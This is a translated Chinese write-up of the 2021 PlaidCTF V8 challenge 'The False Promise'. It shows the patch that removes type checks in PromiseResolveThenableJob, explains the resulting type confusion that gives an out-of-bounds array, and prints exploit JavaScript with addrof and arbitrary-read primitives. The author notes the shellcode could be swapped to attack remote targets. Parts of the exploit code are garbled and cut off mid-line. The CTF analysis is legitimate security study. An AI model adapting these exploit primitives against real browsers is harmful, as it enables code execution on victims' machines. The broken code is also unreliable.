# 2021 PlaidCTF-The False Promise
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 题目分析
题目的diff文件如下：
    diff --git a/src/builtins/promise-jobs.tq b/src/builtins/promise-jobs.tq
    index 80e98f373b..ad5eb093e8 100644
    --- a/src/builtins/promise-jobs.tq
    +++ b/src/builtins/promise-jobs.tq
    @@ -23,10 +23,8 @@ PromiseResolveThenableJob(implicit context: Context)(
       // debugger is active, to make sure we expose spec compliant behavior.
       const nativeContext = LoadNativeContext(context);
       const promiseThen = *NativeContextSlot(ContextSlot::PROMISE_THEN_INDEX);
    -  const thenableMap = thenable.map;
    -  if (TaggedEqual(then, promiseThen) && IsJSPromiseMap(thenableMap) &&
    -      !IsPromiseHookEnabledOrDebugIsActiveOrHasAsyncEventDelegate() &&
    -      IsPromiseSpeciesLookupChainIntact(nativeContext, thenableMap)) {
    +  if (TaggedEqual(then, promiseThen) &&
    +      !IsPromiseHookEnabledOrDebugIsActiveOrHasAsyncEventDelegate()) {
         // We know that the {thenable} is a JSPromise, which doesn't require
         // any special treatment and that {then} corresponds to the initial
         // Promise.prototype.then method. So instead of allocating a temporary
可以发现`patch`去除了某些检查，导致更容易进入`if`分支并执行，很明显这是一个类型混淆的漏洞
`patch`后的完整一点的代码如下：
    [...]
    // https://tc39.es/ecma262/#sec-promiseresolvethenablejob
    transitioning builtin
    PromiseResolveThenableJob(implicit context: Context)(
        promiseToResolve: JSPromise, thenable: JSReceiver, then: JSAny): JSAny {
      // We can use a simple optimization here if we know that {then} is the
      // initial Promise.prototype.then method, and {thenable} is a JSPromise
      // whose
      // @@species lookup chain is intact: We can connect {thenable} and
      // {promise_to_resolve} directly in that case and avoid the allocation of a
      // temporary JSPromise and the closures plus context.
      //
      // We take the generic (slow-)path if a PromiseHook is enabled or the
      // debugger is active, to make sure we expose spec compliant behavior.
      const nativeContext = LoadNativeContext(context);
      const promiseThen = *NativeContextSlot(ContextSlot::PROMISE_THEN_INDEX);
      if (TaggedEqual(then, promiseThen) &&
          !IsPromiseHookEnabledOrDebugIsActiveOrHasAsyncEventDelegate()) {
        // We know that the {thenable} is a JSPromise, which doesn't require
        // any special treatment and that {then} corresponds to the initial
        // Promise.prototype.then method. So instead of allocating a temporary
        // JSPromise to connect the {thenable} with the {promise_to_resolve},
        // we can directly schedule the {promise_to_resolve} with default
        // handlers onto the {thenable} promise. This does not only save the
        // JSPromise allocation, but also avoids the allocation of the two
        // resolving closures and the shared context.
        //
        // What happens normally in this case is
        //
        //   resolve, reject = CreateResolvingFunctions(promise_to_resolve)
        //   result_capability = NewPromiseCapability(%Promise%)
        //   PerformPromiseThen(thenable, resolve, reject, result_capability)
        //
        // which means that PerformPromiseThen will either schedule a new
        // PromiseReaction with resolve and reject or a PromiseReactionJob
        // with resolve or reject based on the state of {thenable}. And
        // resolve or reject will just invoke the default [[Resolve]] or
        // [[Reject]] functions on the {promise_to_resolve}.
        //
        // This is the same as just doing
        //
        //   PerformPromiseThen(thenable, undefined, undefined,
        //   promise_to_resolve)
        //
        // which performs exactly the same (observable) steps.
        return PerformPromiseThen(
            UnsafeCast(thenable), UndefinedConstant(),
            UndefinedConstant(), promiseToResolve);
      [...]
跟进到`src/builtins/promise-abstract-operations.tq`的`PerformPromiseThen`函数
    // https://tc39.es/ecma262/#sec-performpromisethen
    transitioning builtin
    PerformPromiseThen(implicit context: Context)(
        promise: JSPromise, onFulfilled: Callable|Undefined,
        onRejected: Callable|Undefined, resultPromise: JSPromise|Undefined): JSAny {
      PerformPromiseThenImpl(promise, onFulfilled, onRejected, resultPromise);
      return resultPromise;
    }
    @export
    transitioning macro PerformPromiseThenImpl(implicit context: Context)(
        promise: JSPromise, onFulfilled: Callable|Undefined,
        onRejected: Callable|Undefined,
        resultPromiseOrCapability: JSPromise|PromiseCapability|Undefined): void {
        DebugBreak();
      if (promise.Status() == PromiseState::kPending) {
        // The {promise} is still in "Pending" state, so we just record a new
        // PromiseReaction holding both the onFulfilled and onRejected callbacks.
        // Once the {promise} is resolved we decide on the concrete handler to
        // push onto the microtask queue.
        const handlerContext = ExtractHandlerContext(onFulfilled, onRejected);
        const promiseReactions =
            UnsafeCast(promise.reactions_or_result);
        const reaction = NewPromiseReaction(
            handlerContext, promiseReactions, resultPromiseOrCapability,
            onFulfilled, onRejected);
        promise.reactions_or_result = reaction;   pwn() , 4);
> 这里的`new Object()`是为了进入`PerformPromiseThenImpl`的 `if (promise.Status() ==
> PromiseState::kPending)`分支
我们加一个断点断在`PerformPromiseThenImpl`的开头，首先进入 `if (promise.Status() ==
PromiseState::kPending)`分支
此时部分寄存器的值的含义如下
    RAX 0x3dfb08088b1d 
    RBX 0x3dfb080423b5 
    RCX 0x3dfb080423b5 
    RDX 0x3dfb08088a99 
`RAX`存放的是`p`，`RDX`存放的是`thenable`
走到`reaction`生成完毕
再走一步可以发现`promise.reactions_or_result =
reaction`语句执行完毕，`thenable`的`length`已经被修改为了`reaction`
这样我们便获得了一个`OOB`的数组，那么我们接下来只需要按照普通的思路进行利用即可
## EXP
由于是本地V8复现的所以就只在本地弹了个计算器，感兴趣话可以换个`shellcode`啥的就可以打远程了
    var buf = new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    var Uint32 = new Int32Array(buf);
    function f2i(f){
        float64[0] = f;
        return bigUint64[0];
    }
    function i2f(i){
        bigUint64[0] = i;
        return float64[0];
    }
    function hex(i){
        return '0x' + i.toString(16).padStart(16, '0');
    }
    var thenable = [1.1,2.2,3.3,4.4]
    new Object();
    thenable.then = Promise.prototype.then
    var p = Promise.resolve(thenable);
    function pwn() {
        var a = new Array(0x12345678,0,1); 
        var d = [1.1,2.2]
        let idx = thenable.indexOf(i2f(0x000000002468acf0n)); 
        let element_idx = idx + 6; 
        function addrof(obj){
            a[0] = obj;         
            return f2i(thenable[idx]);
        }
        function arb_read(addr){
            thenable[element_idx] = i2f((4n  pwn() , 4);
## Reference
https://hackmd.io/@aventador/BJkOOyi8u